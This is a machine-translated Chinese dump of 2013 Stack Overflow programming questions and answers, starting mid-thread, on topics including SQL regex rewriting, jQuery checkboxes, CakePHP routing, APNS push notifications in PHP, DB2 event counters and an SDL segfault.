
它应该是

```
select count(*) from table1 join table2 where a=b 
```

“from”后面可以是任意字符串，也可以是空字符串，整个查询可以是多行字符串。

你能帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:35:44.470

这是因为`(.)*`这将捕获第 4 组中的最后一个匹配字符。它应该是`(.*)`

更好的正则表达式是

```
^\s*select .+ from (.*)$ 
```

用。。。来代替

```
select count(*) from $1 
```

# javascript - 确保更改页面后请求将完成

> ID：14853558
> 
> 赞同：0
> 
> 时间：2013-02-13T12:26:50.160
> 
> 标签：javascript, ajax

问题是：我有使用 JavaScript 发送日志的自定义分析引擎。我想在用户提交表单后发送日志。使用 AJAX 发送日志。现在的问题是，表单提交不是AJAX，刷新页面是正常请求。

我已经了解到，即使客户端中止连接，您也可以强制执行脚本

[用户离开页面后php执行是否停止？](https://stackoverflow.com/questions/1280291/does-php-execution-stop-after-a-user-leaves-the-page)

我想学习的是，如果在发送 AJAX 调用后几乎立即提交表单，如何确保服务器接收请求和标头？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:07:06.527

```
var url = "...";
var my_form = document.getElementsByTagName("form")[0];
var request_received = false;

my_form.addEventListener("submit", function(e) {
    if (!request_received) {
        e.preventDefault(); // prevent the form from submitting

        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState >= 2 && !request_received) {
                request_received = true;
                my_form.submit(); // submit the form only if the request has been received
            }
        };
        xhr.open("GET", url, true);
        xhr.send();

        return false;
    }
}, false); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-13T12:33:10.850

假设这是您的带有提交按钮的表单：

```
<form id="myForm" action="/myAction.html" method="POST">

    <!-- form inputs -->
    <input type="submit" value="submit me!" />

</form> 
```

使用 JavaScript，您可以绑定到表单的提交事件，进行 ajax 调用，然后返回 true 以继续将表单提交到服务器：

```
<script type="text/javascript">

document.getElementById('myForm').addEventListener('submit', function(e){
    // do your ajax call here and when you finish, return true from
            // this function (in the ajax success callback)
    return true;
});

</script> 
```

# subdomain - 如何在 CakePHP 中使用虚拟化创建子域

> ID：14853560
> 
> 赞同：0
> 
> 时间：2013-02-13T12:26:52.343
> 
> 标签：subdomain, cakephp-2.0, virtual, routes

如何使用专用路由器在 CakePHP 中使用虚拟化创建子域？

发送到地址

sabz.domain.com/blog/posts/view/10

至

domain.com/blog/posts/view/10/sub:sabz

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-18T12:42:25.407

在 routes.php 中使用以下代码

$subdomain = substr(env("HTTP_HOST"), 0, strpos(env("HTTP_HOST"),"."));

```
if ($subdomain != 'domain') {
  Router::connect('/', array('controller' => 'homes', 'action' =>'userview', 'pass' => $subdomain));
} 
```

并根据您的需要进行更改。

# c# - 如何在 Windows 索引服务中定义网络驱动器的范围？

> ID：14853561
> 
> 赞同：2
> 
> 时间：2013-02-13T12:26:56.170
> 
> 标签：c#, windows, wmi, indexing-service

我在这里遇到了索引服务的问题，我从 ASP.NET 应用程序发送针对索引服务的查询，只要我搜索整个目录，它就可以正常工作。

```
SELECT ... FROM  testCat..Scope('Deep traversal of "\"') 
```

但是，如果我尝试在特定文件夹中搜索，我根本没有得到任何结果。

```
SELECT ... FROM  testCat..Scope('Deep traversal of "\abc"') 
```

或者

```
SELECT ... FROM  testCat..Scope('Deep traversal of "U:\MyIndexFolder\abc"') 
```

MyIndexfolder 文件夹是目录的根目录，子目录“abc”退出。有谁知道我的问题可能是什么原因？

PS 我知道索引服务已被弃用，但无论如何我都必须使用它，所以我希望有人可以提供帮助，因为很难找到有关该主题的有用信息

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T10:25:56.770

我的问题的根源是我的索引文件夹存储在网络驱动器上。在这种情况下，似乎不可能对范围使用相对路径。您必须使用完整的网络路径。

```
//servername/path 
```

我希望这可以帮助其他人！

# algorithm - 找到一个线性时间算法，对区间 [0,2] 中的 n 个数字进行排序，使得对于每 2 个数字 a,b ：|ab| > (1/n)^2

> ID：14853562
> 
> 赞同：0
> 
> 时间：2013-02-13T12:26:56.310
> 
> 标签：algorithm, sorting

我真的很感激任何帮助。这是问题：

找到一个线性时间算法，对区间 [0,2] 中的 n 个数字进行排序，使得对于每 2 个数字 a,b ：|ab| > (1/n)^2

可悲的是，我阅读了这个问题的答案，但仍然不知道如何解决它......这是他们所说的：

对于每个数字 ai（假设 i 是索引），我们将“附加”一个数字 ni，使得：ni/2n2 <= ai <= (ni+1)/2n2

（这正是他们写的方式，我认为他们的意思是 ni/(2n^2) 和 (ni+1)/(2n^2) 但我不确定）。然后他们说不难展示如何在线性时间内对数字 ni 进行排序......

我明白为什么展示如何在线性时间内对数字 ni 进行排序就足够了，但我真的不知道该怎么做......

真的很郁闷... :(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T19:24:37.110

您附上了从 0 到 4n^2 的整数。

如果您以 2n 为底考虑这些，那么您有 2 位数字。

您可以使用具有复杂度 O(nk) 的[基数排序](http://en.wikipedia.org/wiki/Radix_sort)对这些进行排序，其中 k 是位数。

在您的情况下k = 2，所以整体算法是O（2n）= O（n），即线性。

# jquery - jQuery选择所有子复选框

> ID：14853568
> 
> 赞同：13
> 
> 时间：2013-02-13T12:27:15.640
> 
> 标签：jquery

首先，只想说我对 jQuery 毫无希望。

我正在查看此处帖子中的一些代码，该代码选择了每个父复选框（并且有效）：

```
$(function() {
  $(":checkbox").change(function () {
    $(this).parents().children(':checkbox').attr('checked', this.checked);
  });
}); 
```

我们有一个树视图结构`<ul> <li>`，每个`<li>`都有一个复选框。我想做与上述相反的操作，并对所有子复选框执行相同的复选框选择。

任何人都可以修改上述内容吗？

请注意，我们使用的是 razor，每个复选框都是一个 @Html.CheckboxFor，因此输出如下所示：

```
<input name="Survey.Buildings[0].IsSelected" type="checkbox" value="true" checked="checked" data-val="true" data-val-required="The Selected? field is required." id="Survey_Buildings_0__IsSelected" />
<input name="Survey.Buildings[0].IsSelected" type="hidden" value="false" /> 
```

*   编辑2：

好的，我已经修复了 HTML，结构现在看起来像：

```
<ul>
    <li> Cbx1
        <ul>
            <li> Cbx 2 </li>
        </ul>
    </li>
    <li> Cbx3 </li>
    <li> Cbx4   
        <ul>
            <li> Cbx 5 </li>
            <li> Cbx 6 </li>
        </ul>
    </li>
</ul> 
```

因此，如果 Cbx4 被选中，则 Cbx5 和 6 将被选中，如果未选中，则它们将被选中

非常感激

安迪

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-02-13T12:36:54.020

[***jsFiddle 演示***](http://jsfiddle.net/mU3FV/7/)

```
$(function() {
  $("input[type='checkbox']").change(function () {
    $(this).siblings('ul')
           .find("input[type='checkbox']")
           .prop('checked', this.checked);
  });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:32:17.193

```
$(function() {
  $(":checkbox").change(function () {
    $(this).children(':checkbox').attr('checked', this.checked);
  });
}); 
```

您的问题不太清楚，但您可以通过删除 parent() 重试，如上所示。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-12-22T10:56:25.303

我的解决方案独特而简单

```
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
</head>
<body>
<div>
    <input type="checkbox" id="chk1" class="" onclick="toggleCheckBox(this.id)"> Parent 1 check all
    <br>
    <input type="checkbox" id="choice2" class="chk1"> <br>
    <input type="checkbox" id="choice3" class="chk1"> <br>
    <input type="checkbox" id="choice_1" class="chk1">
    <br>
    <h1> test 2 </h1>
    <input type="checkbox" id="chk2" class="" onclick="toggleCheckBox(this.id)"> Parent 2 check all
    <br>
    <input type="checkbox"  class="chk2">
    <br>
    <h1> test 3 </h1>
    <input type="checkbox" id="chk3" class="" onclick="toggleCheckBox(this.id)"> Parent 3 check all
    <br>
    <input type="checkbox"  class="chk3">
</div>

<script>
        function toggleCheckBox(id) {
            $('#'+id+'').on('change', function() {
                $(this).nextAll('.'+id+'').prop('checked', this.checked);
            });
        }

        //toggleCheckBox('chk1');

</script>
</body>
</html> 
```

# c# - 如何将包含本机调用的 *.jar 转换为 DLL（Mono C#）

> ID：14853569
> 
> 赞同：0
> 
> 时间：2013-02-13T12:27:30.367
> 
> 标签：c#, java, mono, java-native-interface, ikvm

我们正在使用 IKVM 将我们的 *.jar 转换为 dll，我们使用该 dll 将我们的代码迁移到带有 Mono 的 C#。我们遇到了一个问题，尤其是当使用包含 JNI 调用[expl JnativeHook](http://code.google.com/p/jnativehook/)的 jar 时，它会在我们尝试时出错要使用 IKVM 转换它，我已向作者报告错误如下：

```
I'm trying to use JnativeHook.jar library, its work for my java apllications, However:
 Not: JnativeHook its a cross-platform containes  3 .dll  depends on the OS when the java application is running (dynamic loading of *.dll)...
JnativeHook.jar containes also  a package(demo) that containes a main classe, i have solved this problem by deleting this one, now i'm sure that will be converted to dll...
finally, when i try to convert this one to .dll i get this error:

C:\Users\marwen\Desktop\Kid protector\Tools and IDE\ikvmbin-7.2.4630.5\bin>ikvmc JNativeHook.jar
IKVM.NET Compiler version 7.2.4630.5
Copyright (C) 2002-2012 Jeroen Frijters
http://www.ikvm.net/

note IKVMC0002: Output file is "JNativeHook.dll"

*** INTERNAL COMPILER ERROR ***

PLEASE FILE A BUG REPORT FOR IKVM.NET WHEN YOU SEE THIS MESSAGE

System.UnauthorizedAccessException: L'accès au chemin d'accès 'C:\Users\marwen\Desktop\Kid protector\Tools and IDE\ikvmbin-7.2.4630.5\bin\JNativeHook.dll' est refusé.
   à System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   à System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, Str
ing msgPath, Boolean bFromProxy)
   à System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy)
   à System.IO.FileStream..ctor(String path, FileMode mode)
   à IKVM.Reflection.Writer.ModuleWriter.WriteModule(StrongNameKeyPair keyPair, Byte[] publicKey, ModuleBuilder moduleBuilder, PEFileKinds fileKind, PortableExecutableKinds portableExecutableKind, Ima
geFileMachine imageFileMachine, ResourceSection resources, Int32 entryPointToken, Stream stream)
   à IKVM.Reflection.Emit.AssemblyBuilder.SaveImpl(String assemblyFileName, Stream streamOrNull, PortableExecutableKinds portableExecutableKind, ImageFileMachine imageFileMachine)
   à IKVM.Reflection.Emit.AssemblyBuilder.Save(String assemblyFileName, PortableExecutableKinds portableExecutableKind, ImageFileMachine imageFileMachine)
   à IKVM.Internal.CompilerClassLoader.Save()
   à IKVM.Internal.CompilerClassLoader.Compile(String runtimeAssembly, List`1 optionsList)
   à IkvmcCompiler.Compile(String[] args)
   à IkvmcCompiler.Main(String[] args) 
```

来自作者的回应：

```
>Comment By: Jeroen Frijters (jfrijters)
Date: 2013-02-12 03:28

Message:
Thanks. Fixed in cvs. BTW, the error is because ikvmc can't write to
JNativeHook.dll (probably because you don't have write access to the
directory). 
```

正如你所看到的，作者只用了几句话回应了我们，但没有给我们一个解决方案..

我理解的是嵌入式 Dll 会出错，实际上 IKVM 不知道如何使用它（在 JAR 中）......

有一些建议可以解决这个问题吗？PS：什么意思`Fixed in cvs`？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-11T15:07:47.540

问题的原因是您对输出位置没有写权限。在具有写入权限的另一个位置运行该命令。

我认为修复只会阻止“内部编译器错误”消息。

# c# - 文本框上 jquery 的 datepicker 问题

> ID：14853573
> 
> 赞同：1
> 
> 时间：2013-02-13T12:27:38.993
> 
> 标签：c#, jquery, asp.net

我在我的项目中使用“jquery-ui-1.8.12.custom.min.js”文件。我在 aspx 页面中有以下代码

**脚本**

```
<script type="text/javascript" >
    $(function() {
        $('#<%=txtDate.ClientID%>').datepicker();
        });

</script> 
```

**添加文件参考**

```
<script type="text/javascript" src="<%= ResolveUrl("~/script/jquery-ui-1.8.12.custom.min.js") %>" ></script> 
```

但我不知道我错在哪里。请帮我解决这个问题。

我发现了这种错误

![错误控制台中的jquery错误](../Images/b673709b243dac36835887a0a2c39d5d.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:29:48.520

您已经包含了 jQuery ui，但没有包含 jQuery 本身。您需要一个脚本标签来包含 jQuery。

```
<script type="text/javascript" src="<%= ResolveUrl("~/script/jqueryfilenamehere.js") %>" ></script>
<script type="text/javascript" src="<%= ResolveUrl("~/script/jquery-ui-1.8.12.custom.min.js") %>" ></script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:30:28.420

缺少 Jquery 文件在使用 datepicker 之前添加任何 jquery 文件（[http://code.jquery.com/jquery-latest.js](http://code.jquery.com/jquery-latest.js)）：-

```
<script type="text/javascript" src="<%= ResolveUrl("~/script/jquery-latest.js") %>" ></script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-07-17T06:49:06.327

首先确保您添加了 Jquery.js 参考

```
<script type="text/javascript" src="<%= ResolveUrl("~/script/jquery-latest.js") %>" ></script> 
```

如果您在 asp.net 中使用母版页概念，或者您的 jquery.js 文件在母版页中，请确保添加： Page.Header.DataBind(); 和 Page.DataBind(); 到母版页的 PageLoad() 事件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:30:57.363

您忘记包含 jquery：[http](http://code.jquery.com/jquery-1.9.1.min.js) ://code.jquery.com/jquery-1.9.1.min.js jquery-ui 不会自动包含 jquery。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:43:12.337

包括对 jQuery 库的引用。您可以按以下方式使用 Google 托管库中的内容；

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> 
```

# sql - 间隔抽样统计到数据库

> ID：14853574
> 
> 赞同：2
> 
> 时间：2013-02-13T12:27:38.957
> 
> 标签：sql, concurrency, statistics, db2

在我的应用程序中触发了许多各种类型的事件 - 我想随着时间的推移对它们进行计数以进行跟踪。

我试图找出最好的方法来做到这一点。我将有多个服务器和线程保存事件，因此它必须在并发期间工作。

我不能每个事件只有一行，因为事件的数量非常大，必须以某种方式聚合。

所以，我试图为每个事件类型和“时间间隔”创建一个表格行，例如

```
COLUMN
------
ID          
EVENTTYPE
COUNT
FIRSTTIMESTAMP
LASTTIMESTAMP 
```

我首先尝试制作一个由记录器创建新行的解决方案：

```
UDPATE EVENTCOUNTER SET COUNT = COUNT + 1 WHERE LASTTIMESTAMP > CURRENT TIMESTAMP and EVENTTYPE = ?; 
```

如果 num rows updated = 0 则插入带有新时间戳的新行。

但是，要完成这项工作，我必须锁定整个表，这样就不会出现从多个线程创建新行的竞争条件。

IE

```
LOCK TABLE EVENTCOUNTER ..
UPDATE .. 
if numRows = 0 then INSERT ..
COMMIT 
```

这个表锁会对性能产生很大影响吗？没有表锁有没有更好的方法来解决我的问题？

使用 DB2 数据库和 Java 客户端——如果重要的话，实际上是休眠。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T13:56:06.303

我会为每个事件插入一行并每 24 小时运行一次脚本，以便汇总信息并将汇总的信息放在单独的表中。这是 OLAP（analisys 服务等）的经典工作方式。

由于您有很多输入，请考虑使用限制较少的锁（[这里](http://gilroygonsalves.blogspot.co.uk/2010/07/db2-95-and-db2-97-locking-tips.html)是 db2 的事务锁）。毕竟，如果您的汇总结果错过了数百个条目中的几个条目，那还不错。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T14:17:13.420

我对 DB2 了解不多，但在 Oracle 中有插入/更新行或语句级触发器。因此，每次用户插入/更新行触发器时都会触发并执行 smth。（行级触发器）就像你的情况一样更新一些日志或其他表。不确定这个特性在 DB2 中是否可用。仅供参考...

# jquery - jQuery 直接加载到容器中，加载时淡入

> ID：14853579
> 
> 赞同：0
> 
> 时间：2013-02-13T12:28:03.080
> 
> 标签：jquery, load, fadein

我想通过 Ajax 将一些内容直接加载到目标容器中。

```
var theData = $('<div id="tempcontainer">').load('/'+targetProject + ' #containerUID' + targetProject);                 
$( theData ).prependTo( '#targetContainer' ); 
```

这会将数据加载到 my`#targetContainer`中，但给我留下了不必要的`#tempcontainer`. 由于我想将多个项目加载到我的`#targetContainer`我不能重复`#tempcontainers`。

我想要实现的是在`#targetContainer`没有重复的情况下将加载的数据插入我的隐藏`#tempcontainers`（完全避免它会更好），测量它的高度（如果可能的话隐藏），调用一些函数并在内容加载时淡入。

提前致谢！

问候，克纳尔。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:35:35.670

`load()`只是一个方便的快捷方式`$.get`，因此如果将数据存储在变量中，`$.get`可能更合适。然后只是隐藏内容，添加它并淡入。我以不同的顺序进行操作以避免一些问题，但这并不重要：

```
$.get('/'+targetProject , function(data) {
    $( data ).find('#containerUID' + targetProject)
             .hide()
             .fadeIn()
             .prependTo( '#targetContainer' );
}); 
```

# r - 每月累计总和

> ID：14853581
> 
> 赞同：2
> 
> 时间：2013-02-13T12:28:09.563
> 
> 标签：r

我有一个数据形式为：

```
month  price  name
1       200   xyz
1       300   abc
2       500   xyz
3       300   abc
4       400   cde
5       200   cde
5       100   abc
5       200   xyz 
```

我想按月创建累积总和图。任何人都可以帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:35:56.520

尝试：

```
ts.plot(cumsum(as.vector(unlist(tapply(df$price,df$month,sum)))),
        main="cumulative month wise",
        xlab="month",ylab="cumulative",lty=3,col="purple",type="o") 
```

# javascript - 如何在 Windows CE 5.0 下使用 IE 打开弹出窗口？

> ID：14853584
> 
> 赞同：2
> 
> 时间：2013-02-13T12:28:17.670
> 
> 标签：javascript, popup, windows-ce

我正在为手持终端开发我的 Web 项目的一部分，这些终端具有 Windows CE 操作系统。我想在没有工具栏和菜单栏的 Internet Explorer 中打开弹出窗口，但它不在乎，它会打开正常的 ie 页面。有没有办法在没有工具栏和菜单栏的情况下打开弹出窗口？
顺便说一句，它是windows ce 5.0，手持终端是摩托罗拉wt-4090。

```
window.open('foo.aspx', '_blank',
        'width=' + (screen.availWidth - 50) +
        ', height=' + (screen.availHeight - 50) +
        ', left=0, top=0, resizable=yes,status=yes,scrollbars=yes,location=no,menubar=no,toolbar=no'); 
```

# android - 替代 UIApplicationMain 用于跨平台应用程序。

> ID：14853589
> 
> 赞同：1
> 
> 时间：2013-02-13T12:28:38.147
> 
> 标签：android, ios, macos, window, cross-platform

我正在创建一个用于为多个平台创建窗口的类，包括`Windows, Mac, Linux, iOS and Android`. 我希望我的班级按以下方式工作

```
 MyWindow window( "My Window", 480, 320 );
    while( window.IsRunning() )
    {
        // do something
    } 
```

然而，在**iOS**上，我们需要`UIApplicationMain`在 main 被调用之后调用，它会处理所有内部的东西和主循环。我想知道是否有任何方法可以绕过`UIApplicationMain`，以便我可以控制 iOS 上的主循环？一个工作代码示例将有很大帮助。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:44:45.223

正如@H2CO3 所说，你不能。

有很多限制，例如：iOS 移动应用程序只能有一个窗口，但 Mac OS 可以有多个窗口，您将如何处理？

另请参阅[此](http://www.codeproject.com/Articles/121681/Application-s-Life-Cycle-in-iOS4)和[App Life Cycle](https://stackoverflow.com/questions/6519847/what-is-the-life-cycle-of-an-iphone-application)和[Apple Docs](http://developer.apple.com/library/ios/documentation/iphone/conceptual/iphoneosprogrammingguide/iPhoneAppProgrammingGuide.pdf)

但是您可以遵循一些节省时间的技巧。

您可以分部分设计代码

1.  处理数据的代码

2.  处理 UI 更新的代码

    根据原生应用 SDK 设计您的 UI，然后根据回调更新 UI。

    您可以使用不同的工具将您的代码转换为[Google 的 Java To Obj C](http://code.google.com/p/j2objc/)和[ObjC to java](http://code.google.com/p/objc2j/)

只有部分代码可以重用，但大部分代码你已经针对不同的平台进行了重写。

你也可以尝试使用一些[跨平台](http://mobiledevices.about.com/od/mobileappbasics/tp/Top-5-Tools-Multi-Platform-Mobile-App-Development.htm)。

# php - 通过 PHP 与 APNS 通信

> ID：14853590
> 
> 赞同：0
> 
> 时间：2013-02-13T12:28:39.300
> 
> 标签：php, ssl, apple-push-notifications, private-key

我想通过 PHP 脚本与 Apple Push Notification Service 进行通信。但我不断收到以下错误：

> 警告：stream_socket_client()：无法设置私钥文件

我有一个 .pem 文件，如下所示：

```
-----BEGIN CERTIFICATE-----
     Encrypted String
-----END CERTIFICATE-----
     Bag Attributes
     friendlyName: ...
     localKeyID: ...
     Key Attributes: ...
-----BEGIN RSA PRIVATE KEY-----
     Proc-Type: ...
     DEK-Info: ...

     Encrypted String
-----END RSA PRIVATE KEY----- 
```

我正在从 sudo 运行 PHP 脚本。它可以找到 my `.pem file`，因为如果我删除它，我会得到一个`"handshake failure"`错误。

这里有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:35:02.103

我最近制作了一个脚本来发送远程推送通知。我是这样做的：

```
 $message = "A cool message!";
  $deviceid = "";

  $count = 0;

  $ctx = stream_context_create();
  stream_context_set_option($ctx, 'ssl', 'local_cert', 'apns-dev.pem'); 

  $fp = stream_socket_client('ssl://gateway.sandbox.push.apple.com:2195', $err, $errstr, 60, STREAM_CLIENT_CONNECT, $ctx);

  if (!$fp) {
     echo 'Failed to connect ' . $err . $errstr;
  } else {

     $payloads['aps'] = array('alert' => $message, 'badge' => 1, 'sound' => 'default');
     $payload = json_encode($payloads);

     $msg = chr(0) . pack('n',32) . pack('H*', $deviceid) . pack('n',strlen($payload)) . $payload;
     fwrite($fp, $msg);
     $count += 1;
     fclose($fp);

  }   

  echo 'Sended: ' . $count; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:54:01.787

我让它工作了。事实证明，我导出了为推送通知生成的私钥，而不是相应的证书。

# python - django 服务器忽略 POST 请求

> ID：14853594
> 
> 赞同：0
> 
> 时间：2013-02-13T12:28:50.737
> 
> 标签：python, django, thread-safety, tastypie

这真是奇怪的行为。当我多次发出 POST 请求时，django 突然开始忽略它们。我可以在萤火虫中看到，但调试服务器什么也没显示。重新启动服务器没有帮助。更重要的是，当我尝试重新启动服务器时，我总是得到：

```
Error: That port is already in use. 
```

重新启动整个机器会有所帮助。

我认为这可能与

```
Exception AttributeError: AttributeError("'_DummyThread' object has no attribute '_Thread__block'",) in <module 'threading' from '/usr/lib/python2.7/threading.pyc'> ignored 
```

应用解决方法后我遇到的错误但事件：

```
import threading
threading._DummyThread._Thread__stop = lambda x: 42 
```

在[了解 python 线程错误中描述](https://stackoverflow.com/questions/13193278/understand-python-threading-bug)

我仍然有同样的问题。我不知道如何诊断问题的根源。

也许这会有所帮助：

```
OS: ubuntu 12.04 LTS
Processor: Intel® Core™ i7-2720QM CPU @ 2.20GHz × 4 
Python 2.7.3
Django 1.4.1 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:08:33.413

作为一种解决方法，您可以使用该[`--nothreading`](https://docs.djangoproject.com/en/dev/ref/django-admin/#django-admin-option---nothreading%5d)选项来禁用开发服务器中线程的使用。

```
./manage.py runserver --nothreading 
```

# mysql - 插入 MySQL 表时忽略 ORDER BY

> ID：14853597
> 
> 赞同：1
> 
> 时间：2013-02-13T12:29:08.820
> 
> 标签：mysql, sql-order-by, sql-insert

我刚刚将一台 MySQL 5.0 服务器升级到 MySQL 5.5，发现以前工作的存储例程已经损坏。区别：MySQL 5.5 似乎以`INSERT`任意顺序排列。所以在下面的代码中，该`ORDER BY`子句无效。AFAIK，它曾经在 MySQL 5.0 中有过。

```
INSERT INTO MyTable
SELECT * FROM MyOtherTable ORDER BY Col1, Col2 DESC; 
```

人们说，根据定义，顺序在s 中[是无关紧要](https://stackoverflow.com/questions/1950315/row-order-when-inserting-multplie-rows-in-mysql)`INSERT`的：只在使用from table`ORDER BY`时使用。`SELECT`问题是我使用游标来循环表格并执行复杂的操作。当然，我可以将`ORDER BY`语句放在游标定义上：

```
DECLARE cur CURSOR FOR SELECT * FROM MyTable ORDER BY Col1, Col2 DESC; 
```

但这减慢了例程：从 MySQL 5.0 的 10 秒到 MySQL 5.5 的 10 多分钟。

关于如何解决问题的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:31:26.047

添加索引`(Col1, Col2)`以加快排序。

# javascript - ...fetch() 和 toJSON() 响应不匹配

> ID：14853600
> 
> 赞同：0
> 
> 时间：2013-02-13T12:29:11.470
> 
> 标签：javascript, backbone.js, backbone.js-collections

我正在使用集合 url 进行服务调用。服务返回一些json，json长度为13（总之13行数据）。

在这里，this.Collection.fetch() 返回长度为 13 的 json。但 this.Collection.toJSON() 返回长度为 12 的 json。相反，它应该返回长度 13。

在集合解析中，响应返回的是长度为 13 的 json，这是正确的！

tableTemplate 是模板的对象（模板是使用 Handlebars.js 完成的）。

this.Collection.fetch({ 成功：函数(){

```
 console.log("Collection Fetch 2:");
        console.log(this.Collection.fetch());

        console.log("Collection toJSON: ");
        console.log(this.Collection.toJSON());
        console.log(this.Collection.toJSON().length);

        var markup = tableTemplate({List:self.importCollection.toJSON()});
         ...
          ...
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T18:02:26.487

这就是 javascript/backbone 的异步特性

像这样做 ：

```
this.collection.fetch();

//Fetch() is asynchronous call , when it completes fetching it triggers the **reset**   event so you need a event listener for **reset**

this.collection.on('reset',function(data){
console.log(data);                          // this will log the object
});

this.collection.on('reset',function(data){
console.log(JSON.stringify(data));        // This will log the JSON data  
}); 
```

或者你可以这样做：

```
this.collection.fetch({
success : function(){                      // called on completion of fetch()
console.log(data);       
console.log(JSON.stringify(data));  
}
}); 
```

# c++ - 释放有效的 SDL 表面会导致段错误

> ID：14853601
> 
> 赞同：0
> 
> 时间：2013-02-13T12:29:16.500
> 
> 标签：c++, memory, sdl, memory-leaks, surface

**[已解决]**忘记实现复制构造函数和赋值运算符。使用默认复制分配给的实例将获得与创建它指向的表面的实例相同的指针。一旦其中一个销毁或调用*redraw* ()，另一个保留指向已释放内存的指针，并导致分段错误。

* * *

我的应用程序中有一个文本标签类。当它的属性发生变化时，它会自动将自己重新绘制到它的私有表面中。

通常，重绘看起来像这样：

```
void Text::redraw() {
 if(_font==0) return;
 if(_image) {      
  SDL_FreeSurface(_image); //this line throwing a segfault
  _image = 0;
 }

 _image = TTF_RenderUTF8_Blended(_font, _text.c_str(), _color);
} 
```

但是代码在释放表面时崩溃（当然，只有一个有效的，因为当它没有要释放的表面时指针等于 0）。

在某些机器上代码运行良好并释放内存也很奇怪。但在其他方面它崩溃了。

如果我注释掉它释放表面的行，应用程序运行良好，但内存泄漏。我没有找到也没有解释，也没有解决方案。

* * *

我确实在构造函数中将 _ *image*设置为 0。*除了redraw* () 函数（和析构函数）之外，没有任何代码可以更改 _*图像*值或释放表面。

 *以某种方式释放内存仅在 XP 上崩溃。如果我注释掉释放部分，它不会崩溃。这两种变体都适用于 win7（x86 和 x64）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:17:15.800

假设我们通常知道 SDL 运行良好，这给我们留下了以下选项（我想不出其他选项，但可能有一些）

*   库构建不正确的可能性
*   封闭的文本以某种方式被复制到代码中的其他地方（违反了[3 的规则](https://stackoverflow.com/questions/4172722/what-is-the-rule-of-three)
*   其他东西正在使用相同的指针调用 SDL_FreeSurface
*   其他东西正在践踏堆（可能但不太可能，因为这是您所说的唯一失败的实例）；

所以我通常会通过添加一些（grep'able）printfs来调试它，如下所示，然后逐行检查输出：

```
void Text::redraw() {
 if(_font==0) return;
 if(_image) {      
fprintf(stderr,"## $%x freeing $%x",this, _image);
  SDL_FreeSurface(_image);
  _image = 0;
 }

 _image = TTF_RenderUTF8_Blended(_font, _text.c_str(), _color);
fprintf(stderr,"## $%x allocated $%x",this, _image);
} 
```*

# c++ - 无法编译 MEX

> ID：14853603
> 
> 赞同：0
> 
> 时间：2013-02-13T12:29:17.887
> 
> 标签：c++, c, matlab, compiler-errors, mex

我正在尝试从 C++ 源代码编译一些 MATLAB MEX 文件。我要编译的文件[可以在这里找到](http://sourceforge.net/p/oscmex/code/4/tree/trunk/src/)；我在 32 位系统 MATLAB 2012a 上使用 Windows XP，并安装了 Microsoft Windows SDK v7.1 作为我的编译器。

如果我尝试编译，MATLAB 会输出以下错误：

```
>> mex -O -largeArrayDims osc_free_address.c
osc_free_address.c 
osc_free_address.c(1) : error C2059: syntax error : '<' 
osc_free_address.c(37) : error C2015: too many characters in constant 
osc_free_address.c(38) : error C2059: syntax error : '<' 
osc_free_address.c(39) : error C2015: too many characters in constant 
osc_free_address.c(39) : error C2015: too many characters in constant 
osc_free_address.c(39) : error C2015: too many characters in constant 
osc_free_address.c(41) : error C2018: unknown character '0x40' 
osc_free_address.c(43) : error C2015: too many characters in constant 
osc_free_address.c(44) : error C2015: too many characters in constant 
osc_free_address.c(44) : error C2015: too many characters in constant 
osc_free_address.c(44) : error C2015: too many characters in constant 
osc_free_address.c(44) : error C2015: too many characters in constant 
osc_free_address.c(46) : error C2059: syntax error : '<' 
osc_free_address.c(82) : fatal error C1021: invalid preprocessor command 'page' 

  C:\PROGRA~1\MATLAB\R2012A\BIN\MEX.PL: Error: Compile of 'osc_free_address.c' failed. 

Error using mex (line 206)
Unable to complete successfully. 
```

